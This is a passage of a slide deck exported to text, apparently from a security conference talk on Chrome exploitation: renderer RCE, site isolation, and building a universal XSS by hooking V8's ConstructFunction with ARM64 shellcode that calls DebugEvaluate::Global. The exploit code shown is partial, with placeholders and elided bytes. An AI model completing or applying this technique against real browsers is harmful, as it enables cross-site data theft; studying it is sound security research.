const bug_func = eval(`async function *f(arg1, arg2){ ${exploit_body}; }; f`); (async () => { const buffer = new Uint8Array([ // Manipulated WASM module ]); const wasm_code = new Uint8Array([ // Regular WASM code bytes ]); let r = bug_func(wasm_code, buffer.buffer); console.log('triggering'); result = (await r.next()).value; const wasm_instance = new WebAssembly.Instance(result); const f = wasm_instance.exports.main; f(); })();

74

## Slide 75

# **JUST RENDERER RCE?** 😴

const bug_func = eval(`async function *f(arg1, arg2){ ${exploit_body}; }; f`); (async () => { const buffer = new Uint8Array([ // Manipulated WASM module ]); const wasm_code = new Uint8Array([ // Regular WASM code bytes ]); let r = bug_func(wasm_code, buffer.buffer); console.log('triggering'); result = (await r.next()).value; const wasm_instance = new WebAssembly.Instance(result); const f = wasm_instance.exports.main; f(); })();

75

## Slide 76

# **JUST RENDERER RCE?** 😴

const bug_func = eval(`async function *f(arg1, arg2){ ${exploit_body}; }; f`); (async () => { const buffer = new Uint8Array([ // Manipulated WASM module ]); const wasm_code = new Uint8Array([ // Regular WASM code bytes ]); let r = bug_func(wasm_code, buffer.buffer); console.log('triggering'); result = (await r.next()).value; const wasm_instance = new WebAssembly.Instance(result); const f = wasm_instance.exports.main; f(); })();

76

## Slide 77

## **DESKTOP SITE ISOLATION**

77

## Slide 78

## **DESKTOP SITE ISOLATION**

78


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DESKTOP SITE ISOLATION
Site isolation separates pages from different websites into different processes. When site
isolation is turned on, it's harder for malicious sites to bypass security measures that exist to
prevent data theft. It can block the processes from receiving certain types of sensitive data
from other sites and a malicious website will find it much more difficult to steal data from
other sites, even if it can break some rules in its own process.
Site isolation applies to sites such as https://example.com and usually groups together
other origins within that site such as https://a.example.com.
Site isolation is enabled by default on Desktop platforms as of Chrome 76, and for most sites
that users log into on Android as of Chrome 77. Learn more about Site isolation 4.
78
```

## Slide 79

## **DESKTOP SITE ISOLATION**

79


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Site isolation separates pages from different websites into different processes.
79
```

## Slide 80

## **DESKTOP SITE ISOLATION**

80


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Site isolation is enabled by default on Desktop platforms
80
```

## Slide 81

## **DESKTOP SITE ISOLATION**

81

## Slide 82

## **DESKTOP SITE ISOLATION**

82

## Slide 83

## **DESKTOP SITE ISOLATION**

83

## Slide 84

## **MOBILE SITE ISOLATION**

84


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Android
On Android devices with at least 2 GB of RAM, Site Isolation has been enabled for sites that users log into since Chrome 77. In
Chrome 92, this expanded to include sites that use third-party login providers (e.g., OAuth) and sites that adopt Cross-Origin-
Opener-Policy headers.
84
```

## Slide 85

## **MOBILE SITE ISOLATION**

85


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Site Isolation has been enabled for sites that users log into
85
```

## Slide 86

## **MOBILE SITE ISOLATION**

86

## Slide 87

## **MOBILE SITE ISOLATION**

87

## Slide 88

## **MOBILE SITE ISOLATION**

88

## Slide 89

CHROME SBX
DESKTOP SITE  MOBILE SITE
ISOLATION ISOLATION

89

## Slide 90

## **UNIVERSAL XSS**

90

## Slide 91

## **CONSTRUCTING UXSS**

91

## Slide 92

## **CONSTRUCTING UXSS**

void Builtins_ConstructFunction() {

do_stuff(); }

92

## Slide 93

## **CONSTRUCTING UXSS**

void Builtins_ConstructFunction() {

do_stuff(); }

void Builtins_ConstructFunction() { do_uxss(); do_stuff(); }

93

## Slide 94

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c add x2, x28, #0x11 ldur w4, [x1, #0xf] add x4, x28, x4 ldur w4, [x4, #0x1f] [...]

94

## Slide 95

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c + stp x15, lr, [sp, #-16]! + adr x15, . + ldr x15, [x15, #0xc] + blr x15 [...]

95

## Slide 96

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c + stp x15, lr, [sp, #-16]! +   adr x15, . +   ldr x15, [x15, #0xc] +   blr x15 [...]

96

## Slide 97

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c +   stp x15, lr, [sp, #-16]! + adr x15, . + ldr x15, [x15, #0xc] + blr x15 [...]

97

## Slide 98

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c + stp x15, lr, [sp, #-16]! + adr x15, . + ldr x15, [x15, #0xc] + blr x15 [...]

uxss_shellcode: bti c ; save full register context stp x0, x1, [sp, #-16]! [...] str lr, [sp, #-16]! <execute UXSS payload> ; restore ConstructFunction previous instructions ldr lr, [sp], #16 sub lr, lr, #0x14 [...] ; restore register context ldp x28, x29, [sp], #16 [...] ldp x0, x1, [sp], #16 ; return to the beginning of ConstructFunction mov x4, lr ret x4

98

## Slide 99

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c +   stp x15, lr, [sp, #-16]! +   adr x15, . +   ldr x15, [x15, #0xc] + blr x15 [...]

uxss_shellcode: bti c ; save full register context stp x0, x1, [sp, #-16]! [...] str lr, [sp, #-16]! <execute UXSS payload> ; restore ConstructFunction previous instructions ldr lr, [sp], #16 sub lr, lr, #0x14 [...] ; restore register context ldp x28, x29, [sp], #16 [...] ldp x0, x1, [sp], #16 ; return to the beginning of ConstructFunction mov x4, lr ret x4

99

## Slide 100

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c +   stp x15, lr, [sp, #-16]! +   adr x15, . +   ldr x15, [x15, #0xc] +   blr x15 [...]

uxss_shellcode: bti c ; save full register context stp x0, x1, [sp, #-16]! [...] str lr, [sp, #-16]! <execute UXSS payload> ; restore ConstructFunction previous instructions ldr lr, [sp], #16 sub lr, lr, #0x14 [...] ; restore register context ldp x28, x29, [sp], #16 [...] ldp x0, x1, [sp], #16 ; return to the beginning of ConstructFunction mov x4, lr ret x4

100

## Slide 101

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c +   stp x15, lr, [sp, #-16]! +   adr x15, . +   ldr x15, [x15, #0xc] +   blr x15 [...]

uxss_shellcode: bti c ; save full register context stp x0, x1, [sp, #-16]! [...] str lr, [sp, #-16]! <execute UXSS payload> ; restore ConstructFunction previous instructions ldr lr, [sp], #16 sub lr, lr, #0x14 [...] ; restore register context ldp x28, x29, [sp], #16 [...] ldp x0, x1, [sp], #16 ; return to the beginning of ConstructFunction mov x4, lr ret x4

101

## Slide 102

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c +   stp x15, lr, [sp, #-16]! +   adr x15, . +   ldr x15, [x15, #0xc] +   blr x15 [...]

uxss_shellcode: bti c ; save full register context stp x0, x1, [sp, #-16]! [...] str lr, [sp, #-16]! <execute UXSS payload> ; restore ConstructFunction previous instructions ldr lr, [sp], #16 sub lr, lr, #0x14 [...] ; restore register context ldp x28, x29, [sp], #16 [...] ldp x0, x1, [sp], #16 ; return to the beginning of ConstructFunction mov x4, lr ret x4

102

## Slide 103

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c -   add x2, x28, #0x11 -   ldur w4, [x1, #0xf] -   add x4, x28, x4 -   ldur w4, [x4, #0x1f] [...]

uxss_shellcode: bti c ; save full register context stp x0, x1, [sp, #-16]! [...] str lr, [sp, #-16]! <execute UXSS payload> ; restore ConstructFunction previous instructions ldr lr, [sp], #16 sub lr, lr, #0x14 [...] ; restore register context ldp x28, x29, [sp], #16 [...] ldp x0, x1, [sp], #16 ; return to the beginning of ConstructFunction mov x4, lr ret x4

103

## Slide 104

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c -   add x2, x28, #0x11 -   ldur w4, [x1, #0xf] -   add x4, x28, x4 -   ldur w4, [x4, #0x1f] [...]

uxss_shellcode: bti c ; save full register context stp x0, x1, [sp, #-16]! [...] str lr, [sp, #-16]! <execute UXSS payload> ; restore ConstructFunction previous instructions ldr lr, [sp], #16 sub lr, lr, #0x14 [...] ; restore register context ldp x28, x29, [sp], #16 [...] ldp x0, x1, [sp], #16 ; return to the beginning of ConstructFunction mov x4, lr ret x4

104

## Slide 105

## **CONSTRUCTING UXSS**

Builtins_ConstructFunction: bti c -   add x2, x28, #0x11 -   ldur w4, [x1, #0xf] -   add x4, x28, x4 -   ldur w4, [x4, #0x1f] [...]

uxss_shellcode: bti c ; save full register context stp x0, x1, [sp, #-16]! [...] str lr, [sp, #-16]! <execute UXSS payload> ; restore ConstructFunction previous instructions ldr lr, [sp], #16 sub lr, lr, #0x14 [...] ; restore register context ldp x28, x29, [sp], #16 [...] ldp x0, x1, [sp], #16 ; return to the beginning of ConstructFunction mov x4, lr ret x4

105

## Slide 106

## **CONSTRUCTING UXSS**

BUILTIN(GlobalEval) { HandleScope scope(isolate); Handle<Object> x = args.atOrUndefined(isolate, 1); DirectHandle<JSFunction> target = args.target(); DirectHandle<JSObject> target_global_proxy(target->global_proxy(), isolate); if (!Builtins::AllowDynamicFunction(isolate, target, target_global_proxy)) { isolate->CountUsage(v8::Isolate::kFunctionConstructorReturnedUndefined); return ReadOnlyRoots(isolate).undefined_value(); } DirectHandle<JSFunction> function; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( isolate, function, Compiler::GetFunctionFromValidatedString( isolate, direct_handle(target->native_context(), isolate), source, NO_PARSE_RESTRICTION, kNoSourcePosition)); RETURN_RESULT_OR_FAILURE( isolate, Execution::Call(isolate, function, target_global_proxy, {})); }

106

## Slide 107

## **CONSTRUCTING UXSS**

BUILTIN(GlobalEval) { HandleScope scope(isolate); Handle<Object> x = args.atOrUndefined(isolate, 1); DirectHandle<JSFunction> target = args.target(); DirectHandle<JSObject> target_global_proxy(target->global_proxy(), isolate); if (!Builtins::AllowDynamicFunction(isolate, target, target_global_proxy)) { isolate->CountUsage(v8::Isolate::kFunctionConstructorReturnedUndefined); return ReadOnlyRoots(isolate).undefined_value(); } DirectHandle<JSFunction> function; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( isolate, function, Compiler::GetFunctionFromValidatedString( isolate, direct_handle(target->native_context(), isolate), source, NO_PARSE_RESTRICTION, kNoSourcePosition)); RETURN_RESULT_OR_FAILURE( isolate, Execution::Call(isolate, function, target_global_proxy, {})); }

107

## Slide 108

## **CONSTRUCTING UXSS**

BUILTIN(GlobalEval) { HandleScope scope(isolate); Handle<Object> x = args.atOrUndefined(isolate, 1); DirectHandle<JSFunction> target = args.target(); DirectHandle<JSObject> target_global_proxy(target->global_proxy(), isolate); if (!Builtins::AllowDynamicFunction(isolate, target, target_global_proxy)) { isolate->CountUsage(v8::Isolate::kFunctionConstructorReturnedUndefined); return ReadOnlyRoots(isolate).undefined_value(); } DirectHandle<JSFunction> function; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( isolate, function, Compiler::GetFunctionFromValidatedString( isolate, direct_handle(target->native_context(), isolate), source, NO_PARSE_RESTRICTION, kNoSourcePosition)); RETURN_RESULT_OR_FAILURE( isolate, Execution::Call(isolate, function, target_global_proxy, {})); }

108

## Slide 109

## **CONSTRUCTING UXSS**

MaybeDirectHandle<Object> DebugEvaluate::Global(Isolate* isolate, Handle<String> source, debug::EvaluateGlobalMode mode, REPLMode repl_mode) { DirectHandle<NativeContext> context = isolate->native_context(); DirectHandle<JSFunction> function = Factory::JSFunctionBuilder{isolate, shared_info, context}.Build(); DirectHandle<FixedArray> host_defined_options( Cast<Script>(function->shared()->script())->host_defined_options(), isolate); MaybeDirectHandle<Object> result = Execution::CallScript( isolate, function, DirectHandle<JSObject>(context->global_proxy(), isolate), host_defined_options);

return result; }

109

## Slide 110

## **CONSTRUCTING UXSS**

MaybeDirectHandle<Object> DebugEvaluate::Global(Isolate* isolate, Handle<String> source, debug::EvaluateGlobalMode mode, REPLMode repl_mode) { DirectHandle<NativeContext> context = isolate->native_context(); DirectHandle<JSFunction> function =

Factory::JSFunctionBuilder{isolate, shared_info, context}.Build();

DirectHandle<FixedArray> host_defined_options( Cast<Script>(function->shared()->script())->host_defined_options(), isolate); MaybeDirectHandle<Object> result = Execution::CallScript( isolate, function, DirectHandle<JSObject>(context->global_proxy(), isolate), host_defined_options);

return result; }

110

## Slide 111

## **CONSTRUCTING UXSS**

MaybeDirectHandle<Object> DebugEvaluate::Global(Isolate* isolate, Handle<String> source, debug::EvaluateGlobalMode mode, REPLMode repl_mode) { DirectHandle<NativeContext> context = isolate->native_context(); DirectHandle<JSFunction> function =

Factory::JSFunctionBuilder{isolate, shared_info, context}.Build();

DirectHandle<FixedArray> host_defined_options( Cast<Script>(function->shared()->script())->host_defined_options(), isolate);

MaybeDirectHandle<Object> result = Execution::CallScript( isolate, function, DirectHandle<JSObject>(context->global_proxy(), isolate), host_defined_options);

return result; }

111

## Slide 112

## **CONSTRUCTING UXSS**

MaybeDirectHandle<Object> DebugEvaluate::Global(Isolate* isolate, Handle<String> source, debug::EvaluateGlobalMode mode, REPLMode repl_mode) { DirectHandle<NativeContext> context = isolate->native_context(); DirectHandle<JSFunction> function =

Factory::JSFunctionBuilder{isolate, shared_info, context}.Build(); DirectHandle<FixedArray> host_defined_options( Cast<Script>(function->shared()->script())->host_defined_options(), isolate); MaybeDirectHandle<Object> result = Execution::CallScript( isolate, function, DirectHandle<JSObject>(context->global_proxy(), isolate), host_defined_options);

return result; }

112

## Slide 113

## **CONSTRUCTING UXSS**

isolate = Isolate::TryGetCurrent(); source = v8::String::NewFromUTF8( isolate, "<uxss payload>", NewStringType::kNormal = 0, uxss_length ); DebugEvaluate::Global( isolate, source, kDefault = 0, kYes = 0 );

113

## Slide 114

## **CONSTRUCTING UXSS**

isolate = Isolate::TryGetCurrent(); source = v8::String::NewFromUTF8( isolate, "<uxss payload>", NewStringType::kNormal = 0, uxss_length ); DebugEvaluate::Global( isolate, source, kDefault = 0, kYes = 0, );

114

## Slide 115

## **CONSTRUCTING UXSS**

isolate = Isolate::TryGetCurrent(); source = v8::String::NewFromUTF8( isolate, "<uxss payload>", NewStringType::kNormal = 0, uxss_length ); DebugEvaluate::Global( isolate, source, kDefault = 0, kYes = 0, );

115

## Slide 116

## **CONSTRUCTING UXSS**

isolate = Isolate::TryGetCurrent(); source = v8::String::NewFromUTF8( isolate, "<uxss payload>", NewStringType::kNormal = 0, uxss_length ); DebugEvaluate::Global( isolate, source, kDefault = 0, kYes = 0, );

116

## Slide 117

## **CONSTRUCTING UXSS**

isolate = Isolate::TryGetCurrent(); source = v8::String::NewFromUTF8( isolate, "<uxss payload>", NewStringType::kNormal = 0, uxss_length **UXSS UNLOCKED!** );

DebugEvaluate::Global( isolate, source, kDefault = 0, kYes = 0, );

117

## Slide 118

## **CONSTRUCTING UXSS**

# isolate = Isolate::TryGetCurrent(); source = v8::String::NewFromUTF8( isolate, "<uxss payload>", NewStringType::kNormal = 0, uxss_length **UXSS UNLOCKED!** );

DebugEvaluate::Global(
    isolate,
    source,
    kDefault = 0,
    kYes = 0,
);

118

## Slide 119

# **LIVE DEMO**

119

## Slide 120

# **THE END**

120

## Slide 121

# **ACKNOWLEDGEMENTS**

**osec.io @osec_io**

**cor.team @cor_ctf**

121

## Slide 122

# **THANK YOU!**

**ryaagard clubby789 misetichrvoje@gmail.com jamie@osec.io**

**fizzbuzz101 will@willsroot.io**

122
